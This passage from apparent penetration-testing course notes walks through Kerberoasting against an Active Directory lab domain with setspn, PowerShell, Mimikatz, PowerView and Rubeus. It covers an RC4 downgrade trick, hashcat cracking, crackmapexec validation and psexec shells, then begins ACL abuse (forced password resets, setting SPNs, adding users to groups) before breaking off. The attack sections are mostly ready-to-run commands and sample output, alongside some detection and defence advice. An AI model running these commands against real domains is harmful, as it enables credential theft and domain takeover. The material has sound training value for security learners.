→ Outputs directly in Hashcat format
→ Good middle ground
→ One or two commands to get tickets

Method 3: Rubeus (Most Automated)
→ Fastest and most feature rich
→ Many advanced options
→ Industry standard tool for this attack
→ Most commonly used in real assessments
2. Method 1 - Semi-Manual Approach
Step 1 - Enumerate SPNs with setspn.exe

setspn.exe is a built-in Windows binary that has been part of Windows for many years and is used legitimately by administrators to manage SPNs in Active Directory. Because it is a built-in Windows tool, it will never be flagged by antivirus and will always be available on any Windows machine joined to a domain. We use it here to list all SPNs registered in the domain so we can identify which service accounts exist and which ones are worth targeting for Kerberoasting.

cmd
setspn.exe -Q */*

Breaking down every part:

setspn.exe      → built-in Windows SPN management tool
                  lives at C:\Windows\System32\setspn.exe
                  available on ALL Windows machines
-Q              → Query mode = just list, dont modify anything
*/*             → wildcard filter meaning show ALL SPNs
                  format is ServiceClass/Host
                  * means match anything in both positions
                  so */* = show every single SPN in domain

What you find:

CN=ACADEMY-EA-DC01,OU=Domain Controllers
    exchangeAB/ACADEMY-EA-DC01          ← computer account SPN
    TERMSRV/ACADEMY-EA-DC01             ← computer account SPN
    ldap/ACADEMY-EA-DC01.inlanefreight  ← computer account SPN

CN=BACKUPAGENT,OU=Service Accounts     ← USER account SPN = TARGET
    backupjob/veam001.inlanefreight.local

CN=SOLARWINDSMONITOR,OU=Service Accounts ← USER account SPN = TARGET
    sts/inlanefreight.local

CN=sqldev,OU=Service Accounts           ← USER account SPN = TARGET
    MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433

How to identify valuable targets:

Computer accounts (CN=ACADEMY-EA-DC01$):
→ Skip these, they have long random passwords
→ Nearly impossible to crack
→ Not useful for privilege escalation

User accounts (CN=BACKUPAGENT, CN=sqldev):
→ THESE are what we want
→ Humans set these passwords
→ Often weak or never changed
→ Look for these in the output
→ Note down their names for next steps
Step 2 - Request TGS Ticket for Specific Account Using PowerShell

After identifying target accounts we need to actually request the Kerberos TGS tickets. This PowerShell method loads a .NET class that handles Kerberos ticket requests directly. When you run this command Windows automatically sends a TGS request to the Domain Controller and loads the returned encrypted ticket into your current session's memory. You are essentially doing legitimately what any Windows machine does when connecting to a service — asking for a ticket — except instead of using it to connect, we extract it for offline cracking.

powershell
# Step 1: Load the .NET identity model assembly
Add-Type -AssemblyName System.IdentityModel

# Step 2: Request ticket for specific SPN
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"

Breaking down every part:

Add-Type                    → loads a .NET class into PowerShell
-AssemblyName               → specifies which .NET library to load
System.IdentityModel        → library that handles security tokens
                              and Kerberos authentication

New-Object                  → creates a new instance of a .NET object
System.IdentityModel.Tokens → namespace within the library
KerberosRequestorSecurityToken → the specific class that requests
                                  Kerberos tickets
-ArgumentList               → parameters to pass to the class
"MSSQLSvc/DEV-PRE-SQL..."  → the SPN of the account we want
                              a ticket for

What happens internally:
→ PowerShell sends TGS-REQ to Domain Controller
→ DC responds with TGS-REP (encrypted ticket)
→ Ticket loaded into current Windows session memory
→ Encrypted with sqldev account's NTLM hash
→ Ready to be extracted by Mimikatz

What you see:

Id                   : uuid-67a2100c-150f-477c-a28a-19f6cfed4e90-2
ValidFrom            : 2/24/2022 11:36:22 PM
ValidTo              : 2/25/2022 8:55:25 AM
ServicePrincipalName : MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433
SecurityKey          : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey
↑
Ticket is now IN MEMORY
= Ready for Mimikatz to extract
Step 3 - Request ALL Tickets at Once
powershell
setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }

Breaking down this complex command:

setspn.exe -T INLANEFREIGHT.LOCAL -Q */*
→ List ALL SPNs in the domain
→ -T = target this specific domain

| Select-String '^CN' -Context 0,1
→ Filter lines starting with CN (account names)
→ -Context 0,1 = also grab the next line (the SPN itself)
→ This pairs each account with its SPN

| % { New-Object System.IdentityModel... }
→ For EACH result
→ Create a new Kerberos ticket request
→ $_.Context.PostContext[0].Trim() = the SPN from previous output
→ Requests tickets for ALL SPNs automatically

Result: tickets for ALL service accounts loaded into memory at once

Why request all vs one:

Request one specific account:
→ Cleaner, targeted
→ Less noise on the network
→ Better for stealth

Request all at once:
→ Gets everything in one go
→ Useful for broad enumeration
→ More traffic = more detectable
→ Also pulls computer account tickets (less useful)
Step 4 - Extract Tickets from Memory with Mimikatz

Mimikatz is one of the most famous security tools ever created. It can interact with Windows authentication subsystems at a very deep level and extract credentials, tickets, and hashes from memory. Here we use it specifically to extract the Kerberos TGS tickets we just loaded into memory and output them in a format we can crack offline. We use base64 output so the tickets can be easily copied to our Linux attack host for cracking.

cmd
mimikatz # base64 /out:true
mimikatz # kerberos::list /export

Breaking down:

base64 /out:true        → output tickets as base64 encoded strings
                          instead of writing binary .kirbi files to disk
                          base64 is easier to copy-paste to Linux host
                          if you skip this = .kirbi files written to disk
                          which you then download

kerberos::list          → list all Kerberos tickets in current session
/export                 → export/dump the actual ticket data
                          without /export = just lists ticket names
                          with /export = shows the full encrypted ticket

What you find:

[00000002] - 0x00000017 - rc4_hmac_nt
   Server Name: MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433
   Client Name: htb-student @ INLANEFREIGHT.LOCAL
   0x00000017 → this is RC4 encryption = good for cracking

====================
Base64 of file: 2-40a10000-htb-student@MSSQLSvc~DEV-PRE-SQL...kirbi
====================
doIGPzCCBjugAwIBBaEDAgEWooIFKDCCBSRhggUgMIIFHKADAgEFoR...
[LONG BASE64 STRING]
====================
Saved to file: 2-40a10000-htb-student@MSSQLSvc~DEV-PRE-SQL...kirbi
Step 5 - Prepare Base64 Output for Cracking

The base64 output from Mimikatz is wrapped in columns which breaks tools that need it on one line. We need to clean it up before we can convert it back to a crackable format.

bash
# On Linux attack host - remove newlines and whitespace
echo "<paste base64 blob here>" | tr -d \\n

# Convert cleaned base64 back to kirbi file
cat encoded_file | base64 -d > sqldev.kirbi

# Extract hash from kirbi file using kirbi2john
python2.7 kirbi2john.py sqldev.kirbi

# Fix the format for Hashcat
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat

# Verify the hash looks correct
cat sqldev_tgs_hashcat
# Should start with $krb5tgs$23$*

# Crack it
hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt

Breaking down each step:

tr -d \\n           → delete all newline characters
                      makes the base64 one single long line

base64 -d           → decode base64 back to binary kirbi format
> sqldev.kirbi      → save as kirbi file

kirbi2john.py       → converts kirbi binary format
                      into a format john/hashcat can read

sed command         → reformats the hash to exact format
                      that hashcat -m 13100 expects
                      without this step hashcat wont recognize it

hashcat -m 13100    → crack the Kerberos TGS hash
3. Method 2 - PowerView (Faster)
What is PowerView for Kerberoasting?

PowerView is a PowerShell script from the PowerSploit toolkit that makes Active Directory enumeration and attacks extremely easy through simple PowerShell commands. For Kerberoasting specifically, PowerView can find all SPN accounts and automatically request their TGS tickets and output them directly in Hashcat format in just two commands. This completely eliminates the need for Mimikatz and the complex base64 conversion process used in the manual method. The output is clean, properly formatted, and ready for immediate use with Hashcat. The downside is that PowerView is a well-known hacking tool that Windows Defender and most antivirus products will detect and block if real-time protection is enabled.

Task 1 - List All SPN Accounts with PowerView
powershell
# Import PowerView
Import-Module .\PowerView.ps1

# Find all accounts with SPNs
Get-DomainUser * -spn | select samaccountname

Breaking down:

Import-Module .\PowerView.ps1   → load PowerView into current session
                                  must be in same directory as file
                                  or provide full path

Get-DomainUser *                → get ALL domain users
-spn                            → filter: only return users that
                                  have a ServicePrincipalName set
                                  = only Kerberoastable accounts

select samaccountname           → only show the username column
                                  cleaner output, just the names

What you find:

samaccountname
--------------
adfs
backupagent
krbtgt              ← skip this one, built-in account
sqldev              ← HIGH VALUE = Domain Admin
sqlprod
sqlqa
solarwindsmonitor   ← HIGH VALUE = Domain Admin
Task 2 - Get Ticket for Specific User in Hashcat Format
powershell
Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat

Breaking down:

Get-DomainUser -Identity sqldev     → get the sqldev user object
                                      -Identity = specific user

| Get-DomainSPNTicket               → pipe to ticket request function
                                      this automatically requests
                                      the TGS ticket from the DC

-Format Hashcat                     → output the ticket in Hashcat format
                                      = $krb5tgs$23$*...[hash]
                                      ready to feed directly to hashcat
                                      no conversion needed

What you find:

SamAccountName       : sqldev
DistinguishedName    : CN=sqldev,OU=Service Accounts...
ServicePrincipalName : MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433
Hash                 : $krb5tgs$23$*sqldev$INLANEFREIGHT.LOCAL$MSSQLSvc/DEV-PRE-SQL...
                       [LONG HASH STRING - copy everything after Hash: ]
Task 3 - Export ALL Tickets to CSV File
powershell
# Get all SPN users and their tickets, save to CSV
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation

# View the contents
cat .\ilfreight_tgs.csv

Breaking down:

Get-DomainUser * -SPN           → all users with SPNs

| Get-DomainSPNTicket           → request tickets for all of them
-Format Hashcat                 → in Hashcat crackable format

| Export-Csv .\ilfreight_tgs.csv→ save everything to CSV file
-NoTypeInformation              → dont add PowerShell type headers
                                  keeps the CSV clean

Result: one CSV file with ALL tickets from all SPN accounts
        ready for offline cracking session

What the CSV looks like:

"SamAccountName","DistinguishedName","ServicePrincipalName","Hash"
"adfs","CN=adfs,OU=Service Accounts...","adfsconnect/azure01...","$krb5tgs$23$*adfs$..."
"sqldev","CN=sqldev,OU=Service Accounts...","MSSQLSvc/DEV-PRE-SQL...","$krb5tgs$23$*sqldev$..."
"backupagent","CN=BACKUPAGENT...","backupjob/veam001...","$krb5tgs$23$*BACKUPAGENT$..."

Why CSV is useful:

One file contains everything
Easy to sort by account name
Easy to filter by group membership
Transfer to Linux host once = crack everything
No need to run multiple commands
Clean organized format for reporting
4. Method 3 - Rubeus (Most Powerful)
What is Rubeus?

Rubeus is a C# tool specifically designed for Kerberos interaction and abuses. It was written by the same team behind many other popular offensive security tools and is considered the gold standard for Kerberoasting from Windows. Unlike PowerView which is a PowerShell script that can be detected by script analysis, Rubeus is a compiled C# executable which makes it harder to detect through script scanning. It has an enormous number of features including standard Kerberoasting, targeted Kerberoasting with filters, statistics about the environment, encryption type downgrade attacks, and many more advanced Kerberos attack techniques. Most importantly for us, it outputs tickets directly in Hashcat format with a single command and has the /nowrap flag which prevents the hash from being split across multiple lines, making copy-paste to Hashcat much easier.

Task 4 - Check Statistics First
powershell
.\Rubeus.exe kerberoast /stats

Breaking down:

.\Rubeus.exe        → run Rubeus executable
kerberoast          → use the Kerberoasting module
/stats              → only show statistics
                      does NOT request any tickets
                      completely safe enumeration step
                      no tickets requested = no TGS logs on DC

What you find:

Total kerberoastable users: 9

Supported Encryption Type    | Count
RC4_HMAC_DEFAULT             | 7      ← easy to crack
AES128+AES256                | 2      ← harder to crack

Password Last Set Year | Count
2022                   | 9     ← all set same year = gold image?

Why check stats first:

Tells you how many targets exist
Shows encryption types = tells you crack difficulty
RC4 accounts = fast to crack = target these first
AES only accounts = much slower to crack = deprioritize
Password set date = old dates = possibly weak passwords
All same date = deployed from gold image = might same password

This helps you PLAN your attack before requesting tickets
= Smarter and more efficient approach
Task 5 - Kerberoast High Value Accounts (admincount=1)
powershell
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap

Breaking down:

kerberoast              → Kerberoasting module

/ldapfilter:'admincount=1'
→ LDAP filter = only return accounts where admincount=1
→ admincount=1 means the account is or was in a privileged group
→ These are the highest value targets
→ Domain Admins, Server Operators, Backup Operators etc
→ Filter out regular users = focus on privileged accounts only

/nowrap
→ CRITICAL flag
→ Without it: hash is split across multiple lines
→ With it: hash is one long unbroken line
→ Makes copy-paste to hashcat file much easier
→ No need to manually remove line breaks
→ ALWAYS use this flag

What you find:

Total kerberoastable users: 3    ← only 3 have admincount=1

[*] SamAccountName    : backupagent
[*] MemberOf          : CN=Domain Admins
[*] Supported ETypes  : RC4_HMAC_DEFAULT  ← RC4 = easy to crack
[*] Hash              : $krb5tgs$23$*backupagent$INLANEFREIGHT.LOCAL$...[one long line]

[*] SamAccountName    : solarwindsmonitor
[*] MemberOf          : CN=Domain Admins
[*] Supported ETypes  : RC4_HMAC_DEFAULT
[*] Hash              : $krb5tgs$23$*SOLARWINDSMONITOR$...[one long line]
Task 6 - Kerberoast Specific User
powershell
.\Rubeus.exe kerberoast /user:testspn /nowrap

Breaking down:

/user:testspn   → only request ticket for this specific user
                  good when you already identified your target
                  less noisy than requesting all tickets
/nowrap         → keep hash on one line for easy copy
Task 7 - Save All Tickets to File
powershell
.\Rubeus.exe kerberoast /outfile:hashes.txt /nowrap

Breaking down:

/outfile:hashes.txt → save all tickets to this file
                      instead of printing to screen
                      file contains all hashes ready for hashcat
                      transfer file to Linux host for cracking
/nowrap             → no line wrapping in the output file
5. Understanding Encryption Types - Critical Concept
RC4 vs AES - Why It Matters

This is one of the most important concepts in Kerberoasting and directly affects how likely you are to successfully crack a ticket. Kerberos tickets can be encrypted using different algorithms and the strength of that encryption directly determines how hard the ticket is to crack offline. RC4 is an older and weaker encryption algorithm that was the default in Windows for many years. AES is a newer and much stronger algorithm. Most tools default to requesting RC4 tickets because they are much faster to crack, but some accounts are configured to only support AES which makes cracking significantly harder.

Encryption Types Comparison:

RC4 (etype 23):
→ Hash starts with: $krb5tgs$23$*
→ Hashcat mode: -m 13100
→ Cracking speed on CPU: ~800,000 H/s
→ Time to crack weak password: 4 seconds
→ Default for most service accounts
→ MOST COMMON = what you will usually get

AES-128 (etype 17):
→ Hash starts with: $krb5tgs$17$*
→ Hashcat mode: -m 19600
→ Much slower to crack
→ Less common

AES-256 (etype 18):
→ Hash starts with: $krb5tgs$18$*
→ Hashcat mode: -m 19700
→ Cracking speed on CPU: ~10,000 H/s
→ Time to crack same weak password: 4 minutes 36 seconds
→ 27x SLOWER than RC4
→ Configured when org enables AES for service accounts

Real world impact:
RC4 weak password = cracked in seconds
AES-256 weak password = cracked in minutes
AES-256 strong password = could take DAYS or YEARS
How to Check Encryption Type With PowerView
powershell
Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes

What you find:

msds-supportedencryptiontypes   samaccountname
-----------------------------   --------------
0                               testspn    ← 0 = RC4 default = easy to crack
24                              sqlprod    ← 24 = AES 128+256 = harder to crack

Decoding the number:

msds-supportedencryptiontypes values:
0  → not set = defaults to RC4 = EASY to crack
1  → DES only (very old, very rare)
4  → RC4 only
8  → AES-128 only
16 → AES-256 only
24 → AES-128 + AES-256 = HARDER to crack
28 → RC4 + AES-128 + AES-256
Encryption Type Downgrade Attack with Rubeus

Even when an account supports AES encryption, Rubeus has a trick using the /tgtdeleg flag that can force the Domain Controller to give you an RC4 encrypted ticket instead. This works on older Domain Controllers (Windows Server 2016 and earlier) but does NOT work on Windows Server 2019 DCs. This is a significant advantage because it means you can get a faster-to-crack RC4 ticket even for accounts that are configured to support AES.

powershell
# Force RC4 ticket even for AES-enabled accounts
.\Rubeus.exe kerberoast /user:testspn /tgtdeleg /nowrap

Breaking down:

/tgtdeleg   → use TGT delegation trick
              tells the DC we only support RC4
              DC falls back to RC4 for compatibility
              even if account supports AES
              ONLY works on Server 2016 and earlier
              Does NOT work on Server 2019

Result without /tgtdeleg:
$krb5tgs$18$*testspn*  ← AES-256 = slow to crack

Result with /tgtdeleg:
$krb5tgs$23$*testspn*  ← RC4 = fast to crack

Time difference this makes:

Without downgrade:
AES-256 ticket = 4 minutes 36 seconds for weak password on CPU
= Hours to days for stronger passwords on GPU

With downgrade:
RC4 ticket = 4 seconds for same weak password on CPU
= Minutes for stronger passwords on GPU

Real assessment impact:
Without downgrade: hash might not crack in your assessment window
With downgrade: same hash cracks in hours
= Could mean difference between compromising domain or not
6. Cracking Tickets With Hashcat
RC4 Tickets (Most Common)
bash
hashcat -m 13100 rc4_hash.txt /usr/share/wordlists/rockyou.txt

What you find when cracked:

$krb5tgs$23$*sqldev$INLANEFREIGHT.LOCAL$...[hash]...:database!
                                                       ↑
                                               CRACKED PASSWORD

Status: Cracked
Time: 8 seconds
= sqldev password is database!
AES-256 Tickets (Harder)
bash
hashcat -m 19700 aes_hash.txt /usr/share/wordlists/rockyou.txt

What you find:

Status: Running
Time.Estimated: 22 mins, 19 secs  ← much longer than RC4
Speed: 10,277 H/s                  ← much slower than RC4's 821,000 H/s

When finally cracked:
Time.Started: 16:07:50
Time crack found: 16:12:26
= 4 minutes 36 seconds for a WEAK password
= Strong password could take days
Cracking Summary Table
Hash Type    │ Hashcat Mode │ Speed (CPU)  │ Weak Password Time
─────────────┼──────────────┼──────────────┼──────────────────
RC4 (23)     │ -m 13100     │ ~821K H/s    │ Seconds
AES-128 (17) │ -m 19600     │ ~50K H/s     │ Minutes
AES-256 (18) │ -m 19700     │ ~10K H/s     │ 4-5 minutes
7. Complete Step by Step Workflow From Windows
Prerequisites:
You have: shell on Windows machine as domain user
You have: Rubeus.exe and/or PowerView.ps1 available
You have: RDP or WinRM access to Windows attack host

Step 1: Check security controls first
Get-MpComputerStatus | Select RealTimeProtectionEnabled
→ If True: bypass Defender before running tools
→ If False: proceed normally

Step 2: Get statistics about Kerberoastable accounts
.\Rubeus.exe kerberoast /stats
→ See how many accounts exist
→ See encryption types (RC4 vs AES)
→ Plan your attack strategy

Step 3: Identify high value targets
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
→ Get only privileged account tickets
→ These are Domain Admins and similar
→ Copy hashes to file

Step 4: OR get all tickets at once
.\Rubeus.exe kerberoast /outfile:all_hashes.txt /nowrap
→ Saves everything to file
→ Transfer to Linux host for cracking

Step 5: Check encryption types for AES accounts
Get-DomainUser * -SPN -Properties msds-supportedencryptiontypes
→ Identify RC4 accounts (crack first)
→ Identify AES accounts (crack later)

Step 6: Try downgrade for AES accounts if Server 2016 or earlier
.\Rubeus.exe kerberoast /user:targetuser /tgtdeleg /nowrap
→ Force RC4 ticket instead of AES
→ Much faster to crack

Step 7: Transfer hashes to Linux and crack
scp hashes.txt htb-student@LINUXIP:~/hashes.txt
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt

Step 8: Validate cracked credentials
crackmapexec smb 172.16.5.5 -u sqldev -p database!
→ Confirm they work
→ Check for (Pwn3d!) = local admin/Domain Admin

Step 9: Use new credentials
psexec.py inlanefreight.local/sqldev:'database!'@172.16.5.5
→ Get shell with new elevated account
→ Continue domain enumeration
→ Look for further privilege escalation
8. Detection and Defense
How Defenders Detect Kerberoasting
Event ID 4769: A Kerberos service ticket was requested
→ This fires EVERY TIME someone requests a TGS ticket
→ Normal activity generates a few of these per user
→ Kerberoasting generates MANY in quick succession
→ Defenders look for:
   → 10-20+ TGS requests from one account in short time
   → TGS requests with RC4 encryption (0x17 in hex)
     when the domain uses AES = suspicious
   → TGS requests outside business hours
   → TGS requests for accounts not normally accessed

Event ID 4770: A Kerberos service ticket was renewed
→ Also monitored alongside 4769
→ Mass renewals also indicate automated tooling

What the logs show:
Account requesting: htb-student (the attacker)
Account targeted:   sqldev (what they are attacking)
Encryption type:    0x17 = RC4 = suspicious if AES enabled
Defensive Recommendations
1. Use Managed Service Accounts (MSA) or Group MSA (gMSA)
   → Passwords are 240+ random characters
   → Automatically rotate every 30 days
   → Impossible to crack even if ticket obtained
   → Best long-term solution

2. Use LAPS for local accounts
   → Randomizes local admin passwords
   → Prevents lateral movement

3. Set long complex passwords for service accounts
   → Minimum 25+ characters
   → Mix of upper, lower, numbers, symbols
   → Password not based on any dictionary word
   → Even if ticket obtained = cannot crack in reasonable time

4. Restrict RC4 encryption
   → Force AES only for Kerberos
   → Makes cracking much slower
   → TEST THOROUGHLY before implementing
   → Might break legacy applications

5. Monitor Event ID 4769
   → Alert on mass TGS requests from single account
   → Alert on RC4 requests when AES is configured
   → Integrate with SIEM for automated detection

6. Audit SPN accounts regularly
   → Remove SPNs from highly privileged accounts
   → Domain Admins should NEVER have SPNs
   → Regularly review who has SPNs set
   → Remove unnecessary SPNs immediately
9. Key Things to Remember
1. Three methods available from Windows:
   Manual (setspn+PS+Mimikatz) → educational, no extra tools needed
   PowerView → fast, clean CSV output
   Rubeus → fastest, most features, industry standard

2. ALWAYS use /nowrap with Rubeus
   Without it = hash split across lines = hashcat fails
   With it = clean single line = works perfectly

3. Check /stats before requesting tickets
   Tells you encryption types without generating ticket request logs
   Plan your attack before making noise

4. RC4 = fast to crack = mode 13100
   AES-128 = slower = mode 19600
   AES-256 = slowest = mode 19700
   Always identify which type before cracking

5. /tgtdeleg downgrade trick
   Only works on Server 2016 and EARLIER
   Does NOT work on Server 2019
   Can save hours of cracking time when it works

6. admincount=1 filter = target high value accounts first
   /ldapfilter:'admincount=1' in Rubeus
   These are accounts in privileged groups
   Cracking these = immediate high level access

7. Check msds-supportedencryptiontypes attribute
   0 = RC4 default = easy
   24 = AES only = harder
   This tells you what hash you will get before requesting

8. Detection via Event ID 4769
   Mass TGS requests from one account = red flag
   RC4 requests in AES environment = red flag
   Rubeus /jitter flag can add delays to evade detection

9. Best defense = Managed Service Accounts (gMSA)
   240+ char auto-rotating passwords
   Cannot be cracked even if ticket obtained

10. After cracking always validate with crackmapexec
    Confirm credentials work before reporting
    Check (Pwn3d!) = admin level access confirmed

  ACL Abuse - Complete Detailed Notes
1. What is an ACL? (Simple Explanation)

Think of Active Directory like a big office building with hundreds of rooms. Every room has a door and every door has a list of rules about who can enter, who can modify things inside, and who can even change the lock. That list of rules on each door is called an Access Control List or ACL. Every single object in Active Directory — every user, computer, group, file share, and GPO — has its own ACL that controls exactly who can do what to that object. As attackers, we care deeply about ACLs because sometimes administrators accidentally give too many permissions to the wrong people, and those misconfigurations can let us do powerful things like reset passwords, add users to privileged groups, or take complete control of objects we should not have access to at all.

Simple Real World Analogy:

Office Building = Active Directory Domain
Rooms = AD Objects (users, groups, computers)
Door Lock Rules = ACL (Access Control List)
Individual Rules on the Door = ACEs (Access Control Entries)

Example:
Room = sqldev user account
Door Rules (ACL):
→ Domain Admins = can do everything (Full Control)
→ adunn = can change password (Write Permission)
→ Everyone = can read basic info (Read Permission)
→ Guest = cannot enter at all (Deny)

Each of those individual rules = one ACE
All the rules together = the ACL for that object
2. Two Types of ACLs
DACL - Discretionary Access Control List

The DACL is the main type of ACL that most people interact with and the one that matters most for our attacks. The word "Discretionary" means the owner of the object has discretion over who gets access. The DACL contains a list of ACEs that either allow or deny specific users or groups from performing specific actions on an object. When you try to access any object in Active Directory, Windows reads through the DACL from top to bottom until it finds an entry that applies to you. If it finds an Allow entry your action proceeds. If it finds a Deny entry your action is blocked. If there is no DACL at all then everyone gets full access which is a serious misconfiguration. If a DACL exists but has no entries at all then nobody gets access.

DACL Visual Example for user forend:

Object: forend (domain user account)
DACL entries:
┌─────────────────────────────────────────────────────────┐
│ ACE 1: Domain Admins → ALLOW → Full Control             │
│ ACE 2: adunn        → ALLOW → Write All Properties      │
│ ACE 3: Help Desk    → ALLOW → Reset Password            │
│ ACE 4: Authenticated Users → ALLOW → Read Basic Info    │
│ ACE 5: Guest        → DENY  → All Access                │
└─────────────────────────────────────────────────────────┘

When forend tries to do something:
Windows checks list top to bottom
First matching entry = what happens
Deny entries block access immediately
SACL - System Access Control List

The SACL is completely different from the DACL. Instead of controlling who can access something, the SACL controls auditing. It tells Windows when to create log entries about access attempts to an object. Administrators use SACLs to track who is accessing sensitive objects for security monitoring purposes. For example, a SACL on the Domain Admins group might log every time anyone tries to view or modify the group membership. As attackers this matters to us because SACLs determine whether our actions get logged. If a SACL is configured on an object we are attacking, our actions might generate security event logs that defenders can see.

SACL Visual Example:

Object: Domain Admins group
SACL entries:
┌─────────────────────────────────────────────────────────┐
│ Audit Rule: Everyone → Log ALL access attempts          │
│             → Both successful and failed                │
│             → Generates Event ID 4662                   │
└─────────────────────────────────────────────────────────┘

When attacker tries to modify Domain Admins:
→ Action is attempted
→ SACL fires and creates event log
→ Defenders can see who tried to modify the group
→ Generates Security Event in Windows Event Log
3. What is an ACE? (Access Control Entry)

An ACE is one single individual rule inside an ACL. If the ACL is the complete list of rules on a door, each ACE is one specific rule on that list. Every ACE defines exactly one security principal (a user, group, or computer) and exactly what that principal can or cannot do with the object. Every object in Active Directory can have multiple ACEs because multiple people and groups might need different levels of access to the same object. Understanding ACEs is critical because ACL attacks are essentially about finding ACEs that were configured incorrectly — either giving someone too much access or the wrong type of access to an object they should not control.

The Four Components of Every ACE
Every single ACE has exactly FOUR parts:

Component 1: WHO
→ The Security Identifier (SID) of the user/group
→ This is WHO the rule applies to
→ Example: adunn (S-1-5-21-3842939050-...-1164)
→ Could be a user, group, or computer

Component 2: TYPE
→ What kind of ACE this is
→ Three possible types:
   Access ALLOWED ACE → permission granted
   Access DENIED ACE  → permission blocked
   System AUDIT ACE   → generate logs (SACL only)

Component 3: INHERITANCE FLAGS
→ Does this rule apply to child objects too?
→ "This object only" = only affects this specific object
→ "This object and all descendants" = affects object
   AND everything inside it or below it
→ "Descendant objects only" = only child objects

Component 4: ACCESS MASK
→ WHAT specific actions are allowed or denied
→ A 32-bit value that represents specific permissions
→ Examples of what the mask can represent:
   Full Control, Read, Write, Delete,
   Reset Password, Change Membership, etc.
Three Types of ACEs Explained
Type 1: Access Allowed ACE
→ Explicitly GRANTS permissions to a principal
→ Most common type
→ Example: adunn is ALLOWED to reset forend's password
→ Shown with green checkmark in AD GUI

Type 2: Access Denied ACE
→ Explicitly BLOCKS permissions for a principal
→ Takes priority over Allow entries
→ Example: Guest is DENIED from reading forend's info
→ Shown with red X in AD GUI
→ Checked BEFORE allow entries in the list

Type 3: System Audit ACE (in SACL only)
→ Does NOT grant or deny access
→ Creates a log entry when access is attempted
→ Records: who tried, what they tried, success/fail
→ Used by defenders for monitoring
→ As attackers we want to AVOID triggering these
4. Why ACL Attacks Are So Dangerous

ACL attacks are particularly dangerous for several important reasons that make them one of the most valuable techniques in a penetration tester's toolkit. First, ACL misconfigurations are completely invisible to standard vulnerability scanners. Tools like Nessus or OpenVAS scan for missing patches and known vulnerabilities but they have no way to detect that the wrong user has Write permissions over a sensitive account. Second, ACL misconfigurations often persist for years or even decades without anyone noticing because they do not break anything — the organization continues working normally with the misconfiguration silently sitting there. Third, exploiting ACL misconfigurations is usually very low-noise from a detection perspective because you are using legitimate Active Directory features exactly as designed, just with permissions you should not have.

Why ACLs are missed by defenders:

Vulnerability scanners:
→ Check for CVEs = patches = known exploits
→ Cannot check "does adunn have too many rights on forend?"
→ NEVER flagged by Nessus, Qualys etc

Manual reviews:
→ Large org might have 100,000+ ACE entries to check
→ Nobody has time to audit all of them
→ Usually only checked after a breach

Common reasons misconfigs exist:
→ Software installs add ACLs automatically
   (Exchange adds 1000s of ACL changes on install)
→ Legacy configurations from years ago
→ Admin gave access "temporarily" and forgot
→ Convenience = "just give them full control"
→ Migrations from old domain brought bad ACLs
5. ACE Permissions We Target (The Exploitable Ones)
ForceChangePassword

ForceChangePassword is an ACE permission that gives the holder the right to reset another user's password without needing to know the current password. This is legitimately used by Help Desk staff who need to reset user passwords when users forget them. However if an attacker gains control of an account that has ForceChangePassword over a privileged account, they can simply reset that privileged account's password to something they choose and then log in as that account. This is one of the most directly exploitable ACE permissions because it leads immediately to account takeover. The main risk is that it is destructive — the legitimate user will suddenly find their password changed and cannot log in which will definitely cause an alert.

ForceChangePassword Explained:

Normal use:
Help Desk user (jsmith) → has ForceChangePassword over all users
User calls = forgot password
jsmith resets it = no problem

Attack use:
We compromise jsmith account
jsmith has ForceChangePassword over Domain Admin (dadunn)
We reset dadunn password to Password123!
We login as dadunn = Domain Admin
= Full domain compromise

PowerView command to abuse:
Set-DomainUserPassword -Identity dadunn -AccountPassword (ConvertTo-SecureString 'NewPassword123!' -AsPlainText -Force) -Verbose

Risk level: HIGH NOISE
→ Legitimate user loses access = they will notice
→ Always consult client before doing this
→ Document everything = revert after
GenericWrite

GenericWrite gives you the right to write to any non-protected attribute on an object. This sounds technical but in practice it means you can modify many important properties of an object. On a user account, the most powerful thing you can do with GenericWrite is assign an SPN to that user account. Once you assign an SPN to an account you can then perform a targeted Kerberoasting attack against that specific account — request a TGS ticket for the SPN you just set, crack the ticket offline, and get the user's password. On a group object, GenericWrite usually lets you add members to the group meaning you can add yourself or any account you control to that group and inherit all of its permissions.

GenericWrite Explained:

Over a USER account:
→ Can write attributes = assign SPN to the user
→ Once SPN is set = perform Kerberoasting
→ Request TGS ticket = crack offline = get password
→ Targeted Kerberoasting = silent attack

Attack steps:
1. We have GenericWrite over sqlprod user
2. Set SPN on sqlprod:
   Set-DomainObject -Identity sqlprod -SET @{serviceprincipalname='notahacker/LEGIT'}
3. Kerberoast sqlprod:
   GetUserSPNs.py -request-user sqlprod domain/user
4. Crack the ticket:
   hashcat -m 13100 sqlprod.hash rockyou.txt
5. Get sqlprod password = new access

Over a GROUP:
→ Can add members to the group
→ Add yourself to Domain Admins
→ Instant privilege escalation

Attack steps:
1. We have GenericWrite over IT Admins group
2. Add our user to the group:
   Add-DomainGroupMember -Identity 'IT Admins' -Members 'ouruser'
3. We are now in IT Admins = their permissions
GenericAll

